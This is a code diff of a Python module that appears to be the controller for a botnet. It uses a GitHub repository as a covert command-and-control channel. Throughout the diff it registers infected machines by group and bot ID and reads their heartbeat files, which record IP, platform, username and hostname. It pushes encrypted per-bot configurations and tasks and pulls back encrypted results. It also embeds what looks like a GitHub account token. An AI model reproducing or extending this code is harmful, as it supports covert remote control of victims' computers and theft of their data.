@@ -19,6 +19,7 @@ except ImportError:
 
 from commander.lib.githubapi import GitHubAPI
 from commander.lib.database import init_db
+from commander.lib.datatype import AttribDict
 
 
 class DBManager(object):
@@ -83,16 +84,17 @@ class CommandBase(GitHubAPI, DBManager):
 
     def __init__(self, dbf='../data.db', gtoken=None, guser=None, gpwd=None,
                  grepo=None, gbranch='master'):
-        super(CommandBase, self).__init__(
-            self, dbf=dbf, gtoken=gtoken, guser=guser,
-            gpwd=gpwd, grepo=grepo, gbranch=gbranch)
+        super(CommandBase, self).__init__(dbf=dbf, gtoken=gtoken, guser=guser, gpwd=gpwd, grepo=grepo, gbranch=gbranch)
+        self.root = os.path.join(os.path.dirname(__file__), "..")
+        self.data_path = os.path.join(self.root, 'data')
+        self.conf_path = os.path.join(self.root, 'config')
+        self.default_setting = None
+        self.default_group = '5f03d33d43e04f8f'
         self.init_command()
 
-        self.default_setting = self.get_bot_conf()
-
         self.conf_path = self.default_setting.get('ConfPath')
-        self.knock_path = self.default_setting.get('KnockPath')
-        self.result_path = self.default_setting.get('RetPath')
+        self.knock_path = self.default_setting.get('KnockPath') or 'data/hbt/'
+        self.result_path = self.default_setting.get('RetPath') or 'data/res/'
         self.sys_private_key = RSA.importKey(
             self.default_setting.get('ComPrivateKey'))
         self.sys_public_key = self.sys_private_key.publickey()
@@ -100,22 +102,24 @@ class CommandBase(GitHubAPI, DBManager):
         # self.bot_conf = self.load_bot_config_file()
 
     def init_command(self):
-        if not self.get_bot_conf():
-            conf = {}
-            conf['BaseGH'] = 'how2how$$3bb7f838bdc6a4533e9cad5a9ee83859fea5c78b$$toy'
-            conf['ConfPath'] = 'config/'
-            conf['ModulesPath'] = 'lib/'
-            conf['RetGH'] = 'how2how$$3bb7f838bdc6a4533e9cad5a9ee83859fea5c78b$$toy'
-            conf['RetPath'] = 'data/result'
-            conf['KnockPath'] = 'data/knock'
-            conf['ComPrivateKey'] = self.generate_rsa_key().exportKey('der')
-            conf['BotPrivateKey'] = self.generate_rsa_key().exportKey('der')
-            conf['AESKey'] = self.random_key()
-            conf['HBTime'] = 60
-            self.db.insert('BotSettings', conf)
+        self.default_setting = self.get_bot_conf()
+        if not self.default_setting:
+            self.default_setting = AttribDict()
+            self.default_setting.BaseGH = 'how2how$$3bb7f838bdc6a4533e9cad5a9ee83859fea5c78b$$toy'
+            self.default_setting.ConfPath = 'config'
+            self.default_setting.ModulesPath = 'module'
+            self.default_setting.RetGH = 'how2how$$3bb7f838bdc6a4533e9cad5a9ee83859fea5c78b$$toy'
+            self.default_setting.RetPath = 'data'
+            self.default_setting.KnockPath = 'data'
+            self.default_setting.ComPrivateKey = self.generate_rsa_key().exportKey('der')
+            self.default_setting.BotPrivateKey = self.generate_rsa_key().exportKey('der')
+            self.default_setting.AESKey = self.random_key()
+            self.default_setting.HBTime = 60
+            self.db.insert('BotSettings', self.default_setting)
 
-    def new_bot(self, botid=None, remote=True, raw=False, new_key=True):
+    def new_bot(self, botid=None, gid=None, remote=True, raw=False, new_key=True):
         botid = botid or os.urandom(8).encode('hex')
+        gid = gid or self.default_group
         # conf = self.set_bot_config(botid, **dict())
         conf = self.default_setting     # self.get_bot_conf(botid)
         if new_key:
@@ -132,21 +136,28 @@ class CommandBase(GitHubAPI, DBManager):
 
     def check_bots(self):
         bots = self.get_GH_bots_meta()
-        for b in bots:
-            bid = b['botid']
-            bot = self.get_bot(bid)
-            if not bot:
-                bt = self.get_GH_bot_with_id(bid)
+        for bot in bots:
+            bid = bot['bid']
+            bot_in_db = self.get_bot(bid)
+            if not bot_in_db:
+                # bt = self.get_GH_bot_with_id(bid, gid)
+                # bot_path = b.pop('path')
+                bt = self.get_data_with_path(bot['path'])
                 # bot = dict(BotID=bid, IP=tmp['ip'], Platform=tmp['platform'],
                 #           Username=tmp['username'], Hostname=tmp['hostname'],
                 #            Status='UP', LastValidTime=tmp['timestamp'])
-                bt['SHA'] = b['sha']
+                bt['BotID'] = bid
+                bt['GroupID'] = bot['gid']
+                bt['SHA'] = bot['sha']
                 bt['CheckTime'] = time.time()
                 bt['Status'] = 'ONLINE'
                 self.db.insert('Botlist', bt)
-            if bot and bot['sha'] != b['sha']:
-                bt = self.get_GH_bot_with_id(bid)
-                bt['SHA'] = b['sha']
+            elif bot_in_db and bot_in_db['sha'] != bot['sha']:
+                # bt = self.get_GH_bot_with_id(bid, gid)
+                bt = self.get_data_with_path(bot['path'])
+                bt['BotID'] = bid
+                bt['GroupID'] = bot['gid']
+                bt['SHA'] = bot['sha']
                 bt['CheckTime'] = time.time()
                 # bot['LastValidTime'] = tmp['timestamp']
                 self.db.update('Botlist', bt, dict(BotID=bid))
@@ -172,64 +183,72 @@ class CommandBase(GitHubAPI, DBManager):
         else:
             return False
 
-    def get_GH_bot_with_id(self, botid):
-        info = self.GHget(self.knock_path + botid + '.hbt')
+    def get_GH_bots_meta(self):
+        ret = []
+        bots = self.GHget(self.knock_path)
+        for b in bots:
+            gid, bid = b['name'].split('.')[0].split('-')
+            tmp = dict(bid=bid, gid=gid, path=b['path'], sha=b['sha'])
+            ret.append(tmp.copy())
+        return ret
+
+    def get_GH_bot_with_id(self, botid, groupid):
+        name = '-'.join((groupid, botid)) + '.data'
+        info = self.GHget(self.knock_path + name)
         if info:
-            info = json.loads(info)
-            info = json.loads(info['content'].decode('base64'))
-            return Bot(**info).todict()
+            info = json.loads(self.decrypt(info['content'].decode('base64')), self.sys_private_key)
+            return info
         return {}
 
-    @staticmethod
-    def load_bot_config_file(botid=None):
-        # conf = botid + '.conf' if botid else 'bot.conf'
-        path = '../config/' + botid + '.conf'
-        if not os.path.exists(path):
-            path = '../config/bot.conf'
+    # def bot_conf_path(self, bid, gid=None):
+    #     gid = gid or self.default_group
+    #     return os.path.join(self.conf_path, gid, bid + '.conf')
+    #
+    # def bot_result_path(self, bid, gid=None):
+    #     gid = gid or self.default_group
+    #     return os.path.join(self.data_path, gid, bid, '')
+    #
+    # def load_bot_config_file(self, botid, gid=None):
+    #     path = self.bot_conf_path(botid, gid)
+    #     if not os.path.exists(path):
+    #         path = os.path.join(self.conf_path, 'bot.conf')
+    #
+    #     with open(path, 'rb') as f:
+    #         return json.loads(f.read())
+    #
+    # def save_bot_config_file(self, conf, botid, gid=None):
+    #     path = self.bot_conf_path(botid, gid)
+    #     with open(path, 'rb') as f:
+    #         f.write(json.dumps(conf))
 
-        with open(path, 'rb') as f:
-            return json.loads(f.read())
-
-    @staticmethod
-    def save_bot_config_file(botid, conf):
-        path = path = '../config/' + botid + '.conf'
-        with open(path, 'rb') as f:
-            f.write(json.dumps(conf))
-
-    def save_GH_bot_config(self, botid, config):
-        conf = self.load_bot_config_file(botid)
+    def save_GH_bot_config(self, groupid, botid, config):
+        conf = self.get_bot_conf(botid)
         conf.update(config)
         print('[*] Save local bot config...')
-        self.save_bot_config_file(botid, conf)
+        self.save_bot_conf(botid, conf)
         print('[+] Save ok')
         print('[*] Put/Update remote bot config...')
-        self.put_GH_bot_config(botid, conf)
+        self.put_GH_bot_config(groupid, botid, conf)
         print('[+] Put config on to Github ok')
         return conf
 
-    def put_GH_bot_config(self, botid, config, plain=False):
-        conf_path = self.conf_path + botid + '.conf'
+    def put_GH_bot_config(self, groupid, botid, config, plain=False):
+        name = '-'.join((groupid, botid)) + '.conf'
+        conf_path = '/'.join((self.conf_path, name))
         # key = self.get_bot_key_RSA(botid).publickey()
 
-        key = self.get_bot_key_RSA(botid)
+        if not plain:
+            key = self.get_bot_key_RSA(botid)
+            config = self.encrypt(config, key)
 
         # encrypt config with bot public if plain is False
-        config = config if plain else self.encrypt(config, key)
+        # config = config if plain else self.encrypt(config, key)
 
         conf = self.GHget(conf_path)
         if not conf:
             self.GHput(conf_path, config)
         else:
             self.GHupdate(conf_path, config, conf['sha'])
-
-    def get_GH_bots_meta(self):
-        ret = []
-        bots = self.GHget(self.knock_path)
-        for b in bots:
-            bid = b['name'].split('.')[0]
-            tmp = dict(botid=bid, path=b['path'], sha=b['sha'])
-            ret.append(tmp.copy())
-        return ret
 
     def generate_rsa_key(self, num=2048):
         key = RSA.generate(num)
@@ -258,25 +277,28 @@ class CommandBase(GitHubAPI, DBManager):
         for rt in rts:
             dbrt = self.get_task_result(rt['taskid'], rt['botid'])
             if not dbrt:
-                result = self.get_result_with_path(rt['path'])
+                result = self.get_data_with_path(rt['path'])
+                result['TaskID'] = rt['taskid']
+                result['BotID'] = rt['botid']
                 result['SHA'] = rt['sha']
                 self.db.insert('Taskresult', result)
             elif dbrt['SHA'] == rt['sha']:
                 continue
             else:
-                result = self.get_result_with_path(rt['path'])
+                result = self.get_data_with_path(rt['path'])
+                result['TaskID'] = rt['taskid']
+                result['BotID'] = rt['botid']
                 result['SHA'] = rt['sha']
                 self.db.update(
                     'Taskresult', result,
                     dict(TaskID=rt['taskid'], BotID=rt['botid']))
 
-    def get_result_with_path(self, path):
-        result = self.get(path)
+    def get_data_with_path(self, path):
+        result = self.GHget(path)
         if result:
             content = json.loads(self.decrypt(
                 result['content'].decode('base64'), self.sys_private_key))
-            result = Result(**content)
-            return result.todict()
+            return result
 
         return {}
 
@@ -290,7 +312,7 @@ class CommandBase(GitHubAPI, DBManager):
 
     def get_result_meta(self):
         ret = []
-        results = self.get(self.result_path)
+        results = self.GHget(self.result_path)
         for r in results:
             bid, tid = r['name'].split('.')[:2]
             tmp = dict(botid=bid, taskid=tid, path=r['path'], sha=r['sha'])
@@ -299,12 +321,12 @@ class CommandBase(GitHubAPI, DBManager):
         return ret
 
     def clean_result(self):
-        rts = self.get('data/result/')
+        rts = self.GHget(self.result_path)
         for rt in rts:
-            self.delete(rt['path'], rt['sha'], 'clean')
+            self.GHdelete(rt['path'], rt['sha'], 'clean')
 
     def create_task(self, botid, name, module, Type, **settings):
-        taskid = os.urandom(8).hex()
+        taskid = os.urandom(8).encode('hex')
         task = dict(TaskID=taskid, BotID=botid, Name=name,
                     Module=module, params=settings['params'])
 
@@ -380,48 +402,50 @@ class CommandBase(GitHubAPI, DBManager):
         pass
 
 
-class Object(object):
-
-    def __init__(self, **kw):
-        pass
-
-    def todict(self):
-        return self.__dict__
-
-    def __getattr__(self, k):
-        v = self.__dict__.get(k, None)
-        return v
-
-    def __setattr__(self, k, v):
-        self.__dict__['k'] = v
-
-
-class Bot(Object):
-
-    def __init__(self, **kw):
-        self.BotID = kw.get('botid')
-        self.IP = kw.get('ip')
-        self.Platform = kw.get('platform')
-        self.Username = kw.get('username')
-        self.Hostname = kw.get('hostname')
-        self.Status = 'UP'
-        self.LastValidTime = kw.get('timestamp')
-
-
-class Result(Object):
-
-    def __init__(self, **kw):
-        self.TaskID = kw.get('taskid')
-        self.BotID = kw.get('botid')
-        self.Result = kw.get('result')
-        self.StartTime = kw.get('start')
-        self.ReportTime = kw.get('timestamp')
-
-
-class Task(Object):
-
-    def __init__(self, **kw):
-        pass
+# class Object(object):
+#
+#     def __init__(self, **kw):
+#         pass
+#
+#     def todict(self):
+#         return self.__dict__
+#
+#     def __getattr__(self, k):
+#         v = self.__dict__.get(k, None)
+#         return v
+#
+#     def __setattr__(self, k, v):
+#         self.__dict__['k'] = v
+#
+#
+# class Bot(Object):
+#
+#     def __init__(self, **kw):
+#         self.BotID = kw.get('bot_id')
+#         self.GroupID = kw.get('group_id')
+#         self.IP = kw.get('ip')
+#         self.Platform = kw.get('platform')
+#         self.Username = kw.get('username')
+#         self.Hostname = kw.get('hostname')
+#         # self.
+#         self.Status = 'UP'
+#         self.LastValidTime = kw.get('timestamp')
+#
+#
+# class Result(Object):
+#
+#     def __init__(self, **kw):
+#         self.TaskID = kw.get('taskid')
+#         self.BotID = kw.get('botid')
+#         self.Result = kw.get('result')
+#         self.StartTime = kw.get('start')
+#         self.ReportTime = kw.get('timestamp')
+#
+#
+# class Task(Object):
+#
+#     def __init__(self, **kw):
+#         pass
 
 
 if __name__ == '__main__':
